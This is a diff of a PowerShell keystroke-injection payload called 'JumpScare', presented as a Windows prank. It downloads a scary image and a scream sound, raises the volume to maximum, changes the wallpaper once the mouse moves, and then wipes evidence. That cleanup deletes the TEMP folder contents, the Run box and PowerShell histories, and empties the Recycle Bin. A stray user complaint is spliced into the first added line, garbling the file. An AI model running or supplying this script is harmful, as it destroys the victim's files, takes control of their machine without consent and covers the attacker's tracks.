@@ -1,8 +1,8 @@
-############################################################################################################################################################                      
+The script worked but it showed the wrong image here is the link to the picture https://github.com/Maaaaaaa456/123123/blob/fb096dfc3759eba19092c31f61b8d87098816155/maxresdefault.jpg and here is the code ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : JumpScare         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
@@ -19,34 +19,41 @@
 
 <#
 .NOTES
-    This script can be run as is with the provided execution file
+	This script can be run as is with the provided execution file
 .DESCRIPTION 
-    This script will download a scary image and a scream sound effect hosted with this payload and host volume will be raised to max level
-    Upon running this script it will immediately pause after the downloads until a mouse movement is detected 
-    The capslock button will be pressed every 3 seconds to prevent sleep, and act as an indicator the payload is ready 
-    After a mouse movement is detected their wallpaper will change to the scary image provided and the scream sound effect will play
+	This script will download a scary image and a scream sound effect hosted with this payload and host volume will be raised to max level
+	Upon running this script it will immediately pause after the downloads until a mouse movement is detected 
+	The capslock button will be pressed every 3 seconds to prevent sleep, and act as an indicator the payload is ready 
+	After a mouse movement is detected their wallpaper will change to the scary image provided and the scream sound effect will play
 #>
 
 ############################################################################################################################################################
 
-# Download Image; replace link to $viktortylus to add your own image
+# Download Image; replace link to $image to add your own image
 
-$viktortylus = "https://github.com/Maaaaaaa456/123123/raw/fb096dfc3759eba19092c31f61b8d87098816155/maxresdefault.jpg"
-$i = -join($viktortylus, "?dl=1")
+$RI = Get-Random @(1..3)
+
+$image =  "https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/Assets/JumpScare-Wallpapers/$RI.png"
+
+$i = -join($image,"?dl=1")
+
 iwr $i -O $env:TMP\i.png
 
 # Download WAV file; replace link to $wav to add your own sound
 
-$wav = "https://github.com/Maaaaaaa456/123123/raw/main/Sequence%2001121121_1.wav"
-$w = -join($wav, "?dl=1")
+$wav = "https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG/Payloads/OMG-JumpScare/female_scream.wav?raw=true"
+
+$w = -join($wav,"?dl=1")
 iwr $w -O $env:TMP\s.wav
+
+
 
 #----------------------------------------------------------------------------------------------------
 
 <#
 
 .NOTES 
-    This will take the image you downloaded and set it as the targets wall paper
+	This will take the image you downloaded and set it as the targets wall paper
 #>
 
 Function Set-WallPaper {
@@ -131,10 +138,82 @@ public class Params
 <#
 
 .NOTES 
-    This is to pause the script until a mouse movement is detected
+	This is to pause the script until a mouse movement is detected
 #>
 
 function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Sh
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+<#
+
+.NOTES 
+	This is to play the WAV file
+#>
+
+function Play-WAV{
+$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
+}
+
+#----------------------------------------------------------------------------------------------------
+
+# This turns the volume up to max level
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+#----------------------------------------------------------------------------------------------------
+
+Pause-Script
+Set-WallPaper -Image "$env:TMP\i.png" -Style Center
+Play-WAV
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+#----------------------------------------------------------------------------------------------------
+
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
+
